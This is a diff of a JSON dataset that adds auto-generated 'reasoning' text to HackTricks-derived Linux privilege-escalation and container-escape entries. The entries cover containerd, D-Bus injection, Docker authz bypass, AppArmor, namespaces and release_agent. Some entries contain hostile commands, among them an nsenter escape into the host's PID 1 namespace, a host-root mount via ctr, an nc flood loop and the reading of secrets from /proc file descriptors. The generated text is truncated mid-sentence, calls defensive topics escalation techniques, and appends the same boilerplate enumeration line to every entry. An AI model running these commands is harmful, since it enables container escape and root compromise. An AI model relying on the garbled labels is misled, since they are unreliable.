+  "reasoning": "Privilege escalation technique: PE 1. Target OS: linux. Has 7 associated commands. if you find that a host contains the  ctr  command: You can list the images: And then  run one of those images mounting the host root folder to it : Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/containerd-ctr-privilege-escalation"
  },
  {
@@ -2575,7 +2575,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: PE 2. Target OS: linux. Has 1 associated commands. Run a container privileged and escape from it. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/containerd-ctr-privilege-escalation"
  },
  {
@@ -2698,7 +2698,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: List Service Objects. Target OS: linux. Has 20 associated commands. It's possible to list opened D-Bus interfaces with: bash busctl list  List D-Bus interfaces NAME                                   PID PROCESS         USER             CONNECTION    UNIT               Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/d-bus-enumeration-and-command-injection-privilege-escalation"
  },
  {
@@ -2807,7 +2807,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Service Object Info. Target OS: linux. Has 20 associated commands. Then, you can obtain some information about the interface with: bash busctl status htb.oouch.Block  Get info of \"htb.oouch. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/d-bus-enumeration-and-command-injection-privilege-escalation"
  },
  {
@@ -2836,7 +2836,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: List Interfaces of a Service Object. Target OS: linux. Has 4 associated commands. You need to have enough permissions. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/d-bus-enumeration-and-command-injection-privilege-escalation"
  },
  {
@@ -2915,7 +2915,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Introspect Interface of a Service Object. Target OS: linux. Has 14 associated commands. Note how in this example it was selected the latest interface discovered using the  tree  parameter (_see previous section_): bash busctl introspect htb.oouch. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/d-bus-enumeration-and-command-injection-privilege-escalation"
  },
  {
@@ -3033,7 +3033,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Filtering all the noise <a href=\"#filtering_all_the_noise\" id=\"filtering_all_the_noise\"></a>. Target OS: linux. Has 3 associated commands. If there is just too much information on the bus, pass a match rule like so: Multiple rules can be specified. If a message matches _any_ of the rules, the message will be printed. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/d-bus-enumeration-and-command-injection-privilege-escalation"
  },
  {
@@ -3052,7 +3052,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: **Vulnerable Scenario**. Target OS: linux. Has 2 associated commands. As user  qtc inside the host \"oouch\" from HTB  you can find an  unexpected D-Bus config file  located in _/etc/dbus-1/system.d/htb.oouch.Block. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/d-bus-enumeration-and-command-injection-privilege-escalation"
  },
  {
@@ -3066,7 +3066,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Exploit it. Target OS: linux. Has 1 associated commands. At the end of this page you can find the  complete C code of the D-Bus application . Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/d-bus-enumeration-and-command-injection-privilege-escalation"
  },
  {
@@ -3110,7 +3110,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Python. Target OS: linux. Has 7 associated commands. The following python code will send the payload to the D-Bus connection to the  Block  method via  block_iface. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/d-bus-enumeration-and-command-injection-privilege-escalation"
  },
  {
@@ -3124,7 +3124,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: busctl and dbus-send. Target OS: linux. Has 1 associated commands. -  dbus-send  is a tool used to send message to “Message Bus” - Message Bus – A software used by systems to make communications between applications easily. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/d-bus-enumeration-and-command-injection-privilege-escalation"
  },
  {
@@ -3143,7 +3143,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Secure Access to Docker Engine. Target OS: linux. Has 2 associated commands. The Docker engine can be accessed either locally via a Unix socket or remotely using HTTP. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -3226,7 +3226,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Docker Image Signing. Target OS: linux. Has 1 associated commands. Docker image signing ensures the security and integrity of images used in containers. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -3240,7 +3240,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Containers Security Features. Target OS: linux. Has 1 associated commands. <details> <summary>Summary of Container Security Features</summary> Main Process Isolation Features In containerized environments, isolating projects and their processes is paramount for security and  Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -3283,7 +3283,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: While loop. Target OS: linux. Has 1 associated commands. docker run -d --name malicious-container -c 512 busybox sh -c 'while true; do :; done' bash nc -lvp 4444 >/dev/null & while true; do cat /dev/urandom | nc <target IP> 4444; done Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -3297,7 +3297,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: no-new-privileges. Target OS: linux. Has 1 associated commands. If you are running a container where an attacker manages to get access as a low privilege user. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -3355,7 +3355,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Commands. Target OS: linux. Has 7 associated commands. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/apparmor"
  },
  {
@@ -3374,7 +3374,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: aa-genprof. Target OS: linux. Has 2 associated commands. To easily start creating a profile apparmor can help you. It's possible to make  apparmor inspect the actions performed by a binary and then let you decide which actions you want to allow or deny . Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/apparmor"
  },
  {
@@ -3398,7 +3398,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: No template variables specified. Target OS: linux. Has 3 associated commands. \"/path/to/binary\" {    include <abstractions/base>     No abstractions specified     No policy groups specified     No read paths specified     No write paths specified } bash sudo apparmor_parser -a  Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/apparmor"
  },
  {
@@ -3412,7 +3412,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Modifying a profile from logs. Target OS: linux. Has 1 associated commands. The following tool will read the logs and ask the user if he wants to permit some of the detected forbidden actions: > [!TIP] > Using the arrow keys you can select what you want to allow/deny/whatever Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/apparmor"
  },
  {
@@ -3441,7 +3441,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Managing a Profile. Target OS: linux. Has 4 associated commands. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/apparmor"
  },
  {
@@ -3525,7 +3525,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Logs. Target OS: linux. Has 15 associated commands. Example of  AUDIT  and  DENIED  logs from _/var/log/audit/audit. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/apparmor"
  },
  {
@@ -3668,7 +3668,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Example. Target OS: linux. Has 6 associated commands. (Example from [ here ](https://sreeninet.wordpress. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/apparmor"
  },
  {
@@ -3697,7 +3697,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: AppArmor Docker Bypass1. Target OS: linux. Has 4 associated commands. You can find which  apparmor profile is running a container  using: Then, you can run the following line to  find the exact profile being used : In the weird case you can  modify the apparmor docker p Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/apparmor"
  },
  {
@@ -3741,7 +3741,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: AppArmor Shebang Bypass. Target OS: linux. Has 7 associated commands. In [ this bug ](https://bugs.launchpad. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/apparmor"
  },
  {
@@ -3755,7 +3755,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Minimum Privileges. Target OS: linux. Has 1 associated commands. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/authz-and-authn-docker-access-authorization-plugin"
  },
  {
@@ -3779,7 +3779,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Running a container and then getting a privileged session. Target OS: linux. Has 3 associated commands. In this case the sysadmin  disallowed users to mount volumes and run containers with the  --privileged  flag  or give any extra capability to the container: However, a user can  create a shell inside  Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/authz-and-authn-docker-access-authorization-plugin"
  },
  {
@@ -3818,7 +3818,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Mount Writable Folder. Target OS: linux. Has 6 associated commands. In this case the sysadmin  disallowed users to run containers with the  --privileged  flag  or give any extra capability to the container, and he only allowed to mount the  /tmp  folder: > [!TIP] > No Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/authz-and-authn-docker-access-authorization-plugin"
  },
  {
@@ -3852,7 +3852,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Binds in root. Target OS: linux. Has 5 associated commands. It's possible that when the sysadmin configured the docker firewall he  forgot about some important parameter  of the [ API ](https://docs.docker.com/engine/api/v1. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/authz-and-authn-docker-access-authorization-plugin"
  },
  {
@@ -3866,7 +3866,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Binds in HostConfig. Target OS: linux. Has 1 associated commands. Follow the same instruction as with  Binds in root  performing this  request  to the Docker API: Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/authz-and-authn-docker-access-authorization-plugin"
  },
  {
@@ -3880,7 +3880,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Mounts in root. Target OS: linux. Has 1 associated commands. Follow the same instruction as with  Binds in root  performing this  request  to the Docker API: Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/authz-and-authn-docker-access-authorization-plugin"
  },
  {
@@ -3894,7 +3894,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Mounts in HostConfig. Target OS: linux. Has 1 associated commands. Follow the same instruction as with  Binds in root  performing this  request  to the Docker API: Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/authz-and-authn-docker-access-authorization-plugin"
  },
  {
@@ -3933,7 +3933,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Unchecked JSON Attribute. Target OS: linux. Has 6 associated commands. It's possible that when the sysadmin configured the docker firewall he  forgot about some important attribute of a parameter  of the [ API ](https://docs.docker.com/engine/api/v1. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/authz-and-authn-docker-access-authorization-plugin"
  },
  {
@@ -3957,7 +3957,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Manipulating and Creating cgroups. Target OS: linux. Has 3 associated commands. Processes are assigned to cgroups by  writing their Process ID (PID) to the  cgroup.procs  file . This requires root privileges. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/cgroups"
  },
  {
@@ -3971,7 +3971,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Mounted Docker Socket Escape. Target OS: linux. Has 1 associated commands. If somehow you find that the  docker socket is mounted  inside the docker container, you will be able to escape from it. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -3985,7 +3985,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Capabilities Abuse Escape. Target OS: linux. Has 1 associated commands. You should check the capabilities of the container, if it has any of the following ones, you might be able to scape from it:  CAP_SYS_ADMIN _,_  CAP_SYS_PTRACE ,  CAP_SYS_MODULE ,  DAC_READ_SEARCH ,   Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -3999,7 +3999,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Privileged + hostPID. Target OS: linux. Has 1 associated commands. With these permissions you can just  move to the namespace of a process running in the host as root  like init (pid:1) just running:  nsenter --target 1 --mount --uts --ipc --net --pid -- bash Test it Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -4013,7 +4013,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Privileged. Target OS: linux. Has 1 associated commands. Just with the privileged flag you can try to  access the host's disk  or try to  escape abusing release_agent or other escapes . Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -4046,7 +4046,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Wait for and cat the output. Target OS: linux. Has 1 associated commands. sleep 1 echo \"Done! Output:\" cat ${OUTPUT_PATH} bash root@container:~$ ./release_agent_pid_brute. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -4104,7 +4104,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: hostPID. Target OS: linux. Has 7 associated commands. If you can access the processes of the host you are going to be able to access a lot of sensitive information stored in those processes. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -4118,7 +4118,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: You can open the secret filw with:. Target OS: linux. Has 1 associated commands. cat /proc/635813/fd/4 bash Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/README"
  },
  {
@@ -4238,7 +4238,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: **`/proc/sys/kernel/core_pattern`**. Target OS: linux. Has 4 associated commands. - Described in [core(5)](https://man7.org/linux/man-pages/man5/core.5.html). Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/sensitive-mounts"
  },
  {
@@ -4336,7 +4336,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Docker. Target OS: linux. Has 9 associated commands. The exploitation in Docker (or in Docker Compose deployments) is exactly the same, except that usually the other containers' filesystems are available under a different base path: So the filesystems a Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/sensitive-mounts"
  },
  {
@@ -4350,7 +4350,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Other Sensitive Host Sockets and Directories (2023-2025). Target OS: linux. Has 1 associated commands. Mounting certain host Unix sockets or writable pseudo-filesystems is equivalent to giving the container full root on the node. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/sensitive-mounts"
  },
  {
@@ -4369,7 +4369,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: inside the container (socket is mounted at /host/run/containerd.sock). Target OS: linux. Has 2 associated commands. ctr --address /host/run/containerd.sock images pull docker.io/library/busybox:latest ctr --address /host/run/containerd. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/sensitive-mounts"
  },
  {
@@ -4388,7 +4388,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: docker run --rm -it alpine sh. Target OS: linux. Has 2 associated commands. ls /dev console  fd       mqueue   ptmx     random   stderr   stdout   urandom core     full     null     pts      shm      stdin    tty      zero bash Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/docker-privileged"
  },
  {
@@ -4407,7 +4407,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: docker run --rm -it alpine sh. Target OS: linux. Has 2 associated commands. mount | grep '(ro' sysfs on /sys type sysfs (ro,nosuid,nodev,noexec,relatime) cpuset on /sys/fs/cgroup/cpuset type cgroup (ro,nosuid,nodev,noexec,relatime,cpuset) cpu on /sys/fs/cgroup/cpu type cgroup Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/docker-privileged"
  },
  {
@@ -4426,7 +4426,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: docker run --rm -it alpine sh. Target OS: linux. Has 2 associated commands. mount  | grep /proc. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/docker-privileged"
  },
  {
@@ -4445,7 +4445,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: docker run --rm -it alpine sh. Target OS: linux. Has 2 associated commands. apk add -U libcap; capsh --print [... Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/docker-privileged"
  },
  {
@@ -4464,7 +4464,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: docker run --rm -it alpine sh. Target OS: linux. Has 2 associated commands. grep Seccomp /proc/1/status Seccomp:\t2 Seccomp_filters:\t1 bash Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/docker-privileged"
  },
  {
@@ -4483,7 +4483,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: docker run --rm --privileged -it alpine sh. Target OS: linux. Has 2 associated commands. grep Seccomp /proc/1/status Seccomp:\t0 Seccomp_filters:\t0 bash Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/docker-privileged"
  },
  {
@@ -4502,7 +4502,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: docker run --rm --privileged -it alpine sh. Target OS: linux. Has 2 associated commands. ps -ef PID   USER     TIME  COMMAND     1 root      0:00 sh    18 root      0:00 ps -ef bash Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/docker-privileged"
  },
  {
@@ -4530,7 +4530,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Docker. Target OS: linux. Has 1 associated commands. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/cgroup-namespace"
  },
  {
@@ -4549,7 +4549,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Check which namespace is your process in. Target OS: linux. Has 2 associated commands. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/cgroup-namespace"
  },
  {
@@ -4563,7 +4563,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Enter inside an CGroup namespace. Target OS: linux. Has 1 associated commands. Also, you can only  enter in another process namespace if you are root . And you  cannot   enter  in other namespace  without a descriptor  pointing to it (like  /proc/self/ns/cgroup ). Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/cgroup-namespace"
  },
  {
@@ -4591,7 +4591,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Docker. Target OS: linux. Has 1 associated commands. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/ipc-namespace"
  },
  {
@@ -4610,7 +4610,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Check which namespace is your process in. Target OS: linux. Has 2 associated commands. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/ipc-namespace"
  },
  {
@@ -4624,7 +4624,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Enter inside an IPC namespace. Target OS: linux. Has 1 associated commands. Also, you can only  enter in another process namespace if you are root . And you  cannot   enter  in other namespace  without a descriptor  pointing to it (like  /proc/self/ns/net ). Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/ipc-namespace"
  },
  {
@@ -4652,7 +4652,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Docker. Target OS: linux. Has 1 associated commands. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/mount-namespace"
  },
  {
@@ -4671,7 +4671,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Check which namespace is your process in. Target OS: linux. Has 2 associated commands. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/mount-namespace"
  },
  {
@@ -4690,7 +4690,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Find the processes with an specific namespace. Target OS: linux. Has 2 associated commands. sudo find /proc -maxdepth 3 -type l -name mnt -exec ls -l  {} \\; 2>/dev/null | grep <ns-number> bash findmnt Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/mount-namespace"
  },
  {
@@ -4723,7 +4723,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Check which namespace is your process in. Target OS: linux. Has 2 associated commands. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/network-namespace"
  },
  {
@@ -4737,7 +4737,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Enter inside a Network namespace. Target OS: linux. Has 1 associated commands. Also, you can only  enter in another process namespace if you are root . And you  cannot   enter  in other namespace  without a descriptor  pointing to it (like  /proc/self/ns/net ). Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/network-namespace"
  },
  {
@@ -4765,7 +4765,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Docker. Target OS: linux. Has 1 associated commands. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/pid-namespace"
  },
  {
@@ -4784,7 +4784,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Check which namespace are your process in. Target OS: linux. Has 2 associated commands. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/pid-namespace"
  },
  {
@@ -4798,7 +4798,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Find all PID namespaces. Target OS: linux. Has 1 associated commands. Note that the root use from the initial (default) PID namespace can see all the processes, even the ones in new PID names paces, thats why we can see all the PID namespaces. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/pid-namespace"
  },
  {
@@ -4812,7 +4812,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Enter inside a PID namespace. Target OS: linux. Has 1 associated commands. When you enter inside a PID namespace from the default namespace, you will still be able to see all the processes. And the process from that PID ns will be able to see the new bash on the PID ns. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/pid-namespace"
  },
  {
@@ -4868,7 +4868,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Docker. Target OS: linux. Has 1 associated commands. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/time-namespace"
  },
  {
@@ -4887,7 +4887,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Check which namespace is your process in. Target OS: linux. Has 2 associated commands. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/time-namespace"
  },
  {
@@ -4901,7 +4901,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Enter inside a Time namespace. Target OS: linux. Has 1 associated commands. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/time-namespace"
  },
  {
@@ -4930,7 +4930,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Manipulating Time Offsets. Target OS: linux. Has 4 associated commands. Starting with Linux 5. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/time-namespace"
  },
  {
@@ -4964,7 +4964,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: `unshare(1)` helper flags (util-linux ≥ 2.38). Target OS: linux. Has 5 associated commands. The long options automatically write the chosen deltas to  timens_offsets  right after the namespace is created, saving a manual  echo . Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/time-namespace"
  },
  {
@@ -4992,7 +4992,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Docker. Target OS: linux. Has 1 associated commands. To use user namespace, Docker daemon needs to be started with  --userns-remap=default (In ubuntu 14. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/user-namespace"
  },
  {
@@ -5031,7 +5031,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Check which namespace is your process in. Target OS: linux. Has 6 associated commands. It's possible to check the user map from the docker container with: Or from the host with: Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/user-namespace"
  },
  {
@@ -5045,7 +5045,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Enter inside a User namespace. Target OS: linux. Has 1 associated commands. Also, you can only  enter in another process namespace if you are root . And you  cannot   enter  in other namespace  without a descriptor  pointing to it (like  /proc/self/ns/user ). Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/user-namespace"
  },
  {
@@ -5059,7 +5059,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Create new User namespace (with mappings). Target OS: linux. Has 1 associated commands. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/user-namespace"
  },
  {
@@ -5087,7 +5087,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Docker. Target OS: linux. Has 1 associated commands. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/uts-namespace"
  },
  {
@@ -5106,7 +5106,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Check which namespace is your process in. Target OS: linux. Has 2 associated commands. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/uts-namespace"
  },
  {
@@ -5120,7 +5120,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Enter inside an UTS namespace. Target OS: linux. Has 1 associated commands. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/uts-namespace"
  },
  {
@@ -5154,7 +5154,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Seccomp in Docker. Target OS: linux. Has 5 associated commands. Seccomp-bpf  is supported by  Docker  to restrict the  syscalls  from the containers effectively decreasing the surface area. You can find the  syscalls blocked  by  default  in [https://docs.docker. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/seccomp"
  },
  {
@@ -5202,7 +5202,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
+  "reasoning": "Privilege escalation technique: Note that using \"--inspect-port\" without \"--inspect\" or \"--inspect-brk\" won't run the inspector. Target OS: linux. Has 3 associated commands. Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d For help, see: https://nodejs.org/en/docs/inspector DevTools listening on ws://127.0.0. Run enumeration (linpeas/winpeas) to confirm applicability.",
   "source": "hacktricks/electron-cef-chromium-debugger-abuse"
  },
  {
@@ -5230,7 +5230,7 @@
    }
   ],
   "os": "linux",
-  "reasoning": "",
